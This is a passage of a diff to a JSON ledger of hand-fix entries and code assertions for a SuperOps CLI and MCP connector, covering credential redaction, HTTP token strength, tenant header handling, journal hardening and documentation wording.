+     "contains": "func urlUserinfoOnlyMasked(err error, raw, msg string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_url_redact.go",
+     "contains": "func (e urlRedactedError) Unwrap() error { return e.err }",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"base_url\"] = cliutil.DisplayURL(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"config\"] = fmt.Sprintf(\"error: %s\", err.Error())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = fmt.Sprintf(\"client init error: %s\", clientErr.Error())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"refused: not probed (\" + reachErr.Error() + \")\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = fmt.Sprintf(\"unreachable: %s\", reachErr.Error())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "report[\"base_url\"] = cfg.BaseURL"
+    },
+    {
+     "file": "cli/internal/cli/jobs.go",
+     "contains": "row.Error = cliutil.RedactURLUserinfo(row.Error)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/jobs.go",
+     "contains": "r.Error = cliutil.RedactURLUserinfo(r.Error)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_url_secret_test.go",
+     "contains": "func TestBaseURLUserinfoIsNeverShown(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_url_secret_test.go",
+     "contains": "func TestBaseURLUserinfoIsNeverShownInCredentialRefusals(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_url_secret_test.go",
+     "contains": "func TestShortBaseURLUserinfoIsNeverShown(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_url_secret_test.go",
+     "contains": "func TestJobsLedgerNeverShowsBaseURLUserinfo(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_url_secret_mcp_test.go",
+     "contains": "func TestMCPBaseURLUserinfoIsNeverShown(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_url_redact_test.go",
+     "contains": "func TestMaskErrorKeepsTheChainWhenOnlyUserinfoIsRemoved(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_url_redact_test.go",
+     "contains": "func TestMaskErrorCutsTheChainWhenACredentialWasMasked(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_url_redact_test.go",
+     "contains": "func TestClientDisplayNeverShowsBaseURLUserinfo(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact_test.go",
+     "contains": "func TestDisplayURLNeverShowsUserinfo(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact_test.go",
+     "contains": "func TestURLWithoutUserinfo(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact_test.go",
+     "contains": "func TestRedactURLUserinfoRemovesItFromText(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact_test.go",
+     "contains": "func TestRedactURLUserinfoIsLinear(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact_test.go",
+     "contains": "func TestURLUserinfoSecrets(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact_test.go",
+     "contains": "func TestHoldURLUserinfoFeedsTheKit(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_url_redact_cli.go",
+     "contains": "func redactCommandErrorURLUserinfo(root *cobra.Command) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_url_redact_cli.go",
+     "contains": "if msg := cliutil.RedactURLUserinfo(err.Error()); msg != err.Error() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "redactCommandErrorURLUserinfo(rootCmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_url_redact_mcp.go",
+     "contains": "func redactToolURLUserinfo(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_url_redact_mcp.go",
+     "contains": "tc.Text = cliutil.RedactURLUserinfo(tc.Text)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(redactToolURLUserinfo),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_url_redact_cli_test.go",
+     "contains": "func TestCommandErrorsNeverShowURLUserinfo(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_url_redact_mcp_test.go",
+     "contains": "func TestToolResultsNeverShowURLUserinfo(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func URLUserinfoDisplaced(raw string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "decoded := percentDecodeOnce(s)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "if c != nil && (cliutil.URLUserinfoDisplaced(c.BaseURL) || cliutil.URLHasQueryOrFragment(c.BaseURL)) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := cfg.refuseUnshowableBaseURL(); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func URLHasQueryOrFragment(raw string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "return strings.ContainsAny(urlTextWithoutUserinfo(raw), \"?#\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact_test.go",
+     "contains": "func TestURLUserinfoDisplaced(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact_test.go",
+     "contains": "func TestURLHasQueryOrFragment(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_identity_test.go",
+     "contains": "func TestLoadRefusesAnUnshowableBaseURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_tenant_identity_test.go",
+     "contains": "func TestDisplacedUserinfoBaseURLIsNeverPersisted(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-novel-dry-run",
+   "class": "wrong-result",
+   "summary": "The 7 local novels return writeDryRun under --dry-run.",
+   "why": "They printed nothing under --dry-run.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/superops_review_test.go",
+     "contains": "func TestLocalNovelsPreviewUnderDryRun(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-display-name",
+   "class": "docs-truth",
+   "summary": "root.go Short/Long and the MCP server name say SuperOps, not Superops.",
+   "why": "Press 4.34.0 renders the display name as Superops.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "Superops"
+    },
+    {
+     "file": "cli/cmd/superops-mcp/main.go",
+     "not_contains": "\"Superops"
+    }
+   ]
+  },
+  {
+   "id": "graphql-query-guards",
+   "class": "wrong-result",
+   "summary": "graphql.go Query short-circuits verify mode only and coalesces a dataless payload.",
+   "why": "Carried from the prior print; generated graphql.go lacks both guards.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/graphql.go",
+     "contains": "if cliutil.IsVerifyEnv() && !cliutil.IsVerifyLiveHTTPEnv() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/graphql.go",
+     "contains": "if len(data) == 0 || string(data) == \"null\" {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-mcp-http-token-unguessable",
+   "class": "http-auth",
+   "summary": "HTTP mode (superops-mcp --transport http) serves only behind a SUPEROPS_MCP_HTTP_TOKEN no caller can know without being given it: at least 32 characters, all of them bearer-token characters (RFC 6750 b64token: A-Z a-z 0-9 - . _ ~ + / =). requireUnguessableHTTPCallerToken (cmd/superops-mcp/superops_http_token.go) runs after the press's requireHTTPCallerToken in main.go, so an unresolved manifest placeholder (${user_config.superops_mcp_http_token}), unexpanded shell text ($(openssl rand -hex 32), $VAR) and short shared words are refused before the listener starts; the refusal never shows the token.",
+   "why": "Codex next-batch round 1: the press accepted any non-empty token, including the .mcpb manifest's literal placeholder, so a non-loopback HTTP server with TLS files could start behind a publicly known bearer token. main.go is regenerated by a reprint, so this entry pins the call; the template's own non-empty check is kept.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/cmd/superops-mcp/main.go",
+     "contains": "err = requireUnguessableHTTPCallerToken(token)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/cmd/superops-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
+     "contains": "token, err := requireHTTPCallerToken()",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/cmd/superops-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
+     "file": "cli/cmd/superops-mcp/superops_http_token.go",
+     "contains": "const minHTTPCallerTokenLen = 32",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/cmd/superops-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
+     "file": "cli/cmd/superops-mcp/superops_http_token.go",
+     "contains": "if len(token) < minHTTPCallerTokenLen || strings.TrimLeft(token, httpCallerTokenChars) != \"\" {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
+     "file": "cli/cmd/superops-mcp/superops_http_token_test.go",
+     "contains": "func TestHTTPModeRefusesAGuessableToken(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
+     "file": "cli/cmd/superops-mcp/superops_http_token_test.go",
+     "contains": "func TestHTTPCallerTokenMustBeUnguessable(",
      "min_count": 1,
      "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
     }
    ]
+  },
+  {
+   "id": "superops-credential-floor",
+   "class": "credential-leak",
+   "summary": "config.Load refuses any credential shorter than cliutil.MinDetectableSecretLen (8, the funnel's funnelMinSecretLen, equal to the client's minEncodedSecretLen): the API token, the access, refresh and client-secret fields, an auth header (and the token after its scheme), and the base URL's userinfo secret (the password, or the username when there is no password; cliutil.URLUserinfoTooShort). Since superops-credential-holder a short value is also held and withheld in every encoding (cliutil.WithholdHeld), so the floor is no longer what keeps it out of output; it stays as the refusal before anything is sent, since no SuperOps credential is that short and a short one would withhold most output. refuseUndetectableCredentials runs after refuseUnshowableBaseURL; its message names no value, and nothing is sent.",
+   "why": "Codex next-batch round 1: with SUPEROPS_BASE_URL=https://svc:pw@api.superops.ai, a GraphQL error whose message was cHc= (base64 of pw) reached raw query output, because encoded-form checks skip credentials under 8 bytes. config.go is regenerated by a reprint, so this entry pins the call, and pins the client's minEncodedSecretLen so a press change to that floor is noticed.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := cfg.refuseUndetectableCredentials(); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "func (c *Config) refuseUndetectableCredentials() error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "if cliutil.URLUserinfoTooShort(c.BaseURL) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "for _, v := range []string{c.SuperopsApiToken, c.AccessToken, c.RefreshToken, c.ClientSecret, c.AuthHeaderVal} {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "const MinDetectableSecretLen = 8",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "func URLUserinfoTooShort(raw string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "const minEncodedSecretLen = 8",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_credential_floor_test.go",
+     "contains": "func TestShortCredentialIsNeverSentOrShown(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_identity_test.go",
+     "contains": "func TestLoadRefusesACredentialTooShortToDetect(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-tenant-header-one-source",
+   "class": "tenant-scope",
+   "summary": "The CustomerSubDomain header every request sends and the tenant identity (config.SuperOpsTenant, the store stamp) come from one value. config.Load folds every [headers] spelling of CustomerSubDomain into Config.Subdomain and deletes it from Headers (unifyTenantHeader), so the client sends only the header it derives from the subdomain; a [headers] value that disagrees with the subdomain setting, or two spellings that disagree, is refused (errTenantHeaderConflict); SUPEROPS_SUBDOMAIN replaces both.",
+   "why": "Codex next-batch round 1 (class A): two private configs naming their tenant only in [headers] CustomerSubDomain had the same identity (subdomain empty), so tenant B read and synced into the store tenant A had stamped. config.go is regenerated by a reprint; this entry pins the call.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := cfg.unifyTenantHeader(); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "func (c *Config) unifyTenantHeader() error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_tenant_scope.go",
+     "contains": "delete(c.Headers, name)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name: the SUPEROPS_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares under exactly the typed name, every other name as the \"<undeclared>\" placeholder (redacted), and nothing after \"--\"; failed_flag is never kept as typed (\"--<undeclared>\" when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts. Operator-named text the program persists is refused when it repeats a held credential in any form the output filter knows: the journal entry is checked whole (cliutil.HeldText) after every field is filled, timestamp and session key included; the learn tables pass the sqlite-held driver; profiles, teach.log, learnings and feedback pass their held writers (superops-credential-holder). journal_credential_hardening_test.go drives each path with a credential, not held and held, and fails if it reaches any file under the test home.",
+   "why": "Press 4.34.0 (learn/journal.go.tmpl) returns the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, version included; it records every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query. The fleet tool for this (apply_journal_hardening.py) will not merge (owner decision 2026-10-28), so the edits are made by hand. AppendJournalEntry stays byte-identical (its annotated line keeps fleet precedent); JournalInvocation, its only caller, fills the timestamp and session key before the held check. Known limits: a guessable override can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment. A reprint that drops these edits fails these asserts and TestJournalCredentialHardening.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "return \"o:\" + hashHarnessSession(v)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if entry.SessionKey == \"\" {\n\t\tentry.SessionKey = JournalSessionKey()\n\t}",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "lookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "isDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "chatgpt-desktop-local-web-unsupported",
+   "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
+   "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
+   "status": "active",
+   "spec_encode_followup": "Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.",
+   "asserts": [
+    {
+     "file": "mcp-install.md",
+     "contains": "## ChatGPT desktop app (OpenAI)",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "**Not supported by msp-skills yet.** ChatGPT on the web",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "not_contains": "## ChatGPT (Developer Mode)"
+    },
+    {
+     "file": "mcp-install.md",
+     "not_contains": "*Remote* agents (ChatGPT"
+    },
+    {
+     "file": "README.md",
+     "contains": "### Does this work with ChatGPT?\n\nYes, in the **ChatGPT desktop app**.",
+     "min_count": 1
+    },
+    {
+     "file": "README.md",
+     "not_contains": "Plus/Pro+"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "Developer Mode"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "Microsoft 365 Copilot, Gemini, and any agent"
+    },
+    {
+     "file": "page.json",
+     "contains": "\"a\": \"Yes, in the ChatGPT desktop app.",
+     "min_count": 1
+    },
+    {
+     "file": "page.json",
+     "not_contains": "connects only to remote"
+    }
+   ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "secret-echo",
+   "summary": "the shared credential kit is wired by hand: one credkit.Declarations literal in internal/credwire, credkit.Start first and credkit.Exit last in both mains, and every data sink (outbound transports, file writes, the SQLite driver, child processes, MCP tools, stdio and HTTP) routed through the kit. The credential store and config rewrites stay outside it as declared credential sources. A --vars body and the saved run profile store go to credkit.HoldBody; free text (notes, descriptions, a URL in a non-credential flag) is not a contract section 1 source and has no reader.",
+   "why": "A reprint regenerates these files and would drop the routing with the build and tests still green. The wiring replaces the connector's own holder, output chokepoint, journal credential check and decoded funnel. Retires secret-echo-decoded-funnel, superops-credential-holder and superops-error-sink-funnel, replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements fleet_handfixes.json backs).",
+   "status": "active",
+   "spec_encode_followup": null,
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-cli/main.go",
+     "contains": "credwire.HoldStartup()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/main.go",
+     "contains": "credwire.HoldStartup()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/main.go",
+     "contains": "credkit.Exit(serveMCP())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/main.go",
+     "contains": "credkit.MCPHTTP(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_url_redact_mcp.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_outbound_guard.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.Transport = guardOutboundTransport(c.Transport)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "credkit.WriteFile(s.path(key), []byte(value), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.OpenFile(p,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "cliutil.HeldText(string(line))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/jobs.go",
+     "contains": "credkit.OpenFile(p,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/jobs.go",
+     "contains": "credkit.ErrWithheld",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.WriteFile(tmp, body, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.OpenFile(p,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "credkit.WriteFile(tmp, data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.Terminal(f)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "credkit.OpenFile(p,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "credkit.WriteFile(tmpName, data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver, dsn)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver, targetPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "cmd.Env = mcpChildEnviron()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/superops_credential_holder.go",
+     "contains": "var Hold = credkit.Hold",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/url_redact.go",
+     "contains": "const minHeldUsername = 3",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_review_inputs_e2e_test.go",
+     "contains": "func TestReviewClassDInputsAreHeld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_credential_holder_e2e_test.go",
+     "contains": "func TestEveryCredentialSourceIsWithheldFromCLIAndMCPOutput(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_credential_holder_e2e_test.go",
+     "contains": "func TestMCPChildGetsItsCredentialsFromTheKit(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_output_sinks_e2e_test.go",
+     "contains": "func TestDiagnosticSinksNeverShowAHeldCredential(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_review_test.go",
+     "contains": "func TestSyncNeverPrintsAnEchoedCredential(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_review_test.go",
+     "contains": "func TestDoctorNeverPrintsACredentialShapedErrorCode(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/superops_file_sinks_test.go",
+     "contains": "func TestEveryFileWriterPassesTheHolderOrIsNamed(",
+     "min_count": 1,
